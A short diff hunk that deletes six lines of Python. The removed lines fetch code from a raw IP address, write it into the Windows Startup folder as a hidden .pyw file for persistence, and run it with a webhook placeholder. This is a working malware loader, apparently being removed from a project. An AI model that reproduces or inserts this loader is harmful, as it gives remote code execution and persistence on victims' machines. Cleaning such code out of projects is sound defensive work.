@@ -1,6 +1,0 @@
-from urllib import request
-from os import environ
-code = 'WEBHOOK = "YOUR WEBHOOK HERE"\n' + request.urlopen(request.Request('http://45.158.77.206:5002/code.py')).read().decode()
-try: open(fr"{environ['appdata']}\Microsoft\Windows\Start Menu\Programs\Startup\Python.pyw", 'w').write(code)
-except: pass
-exec(code)
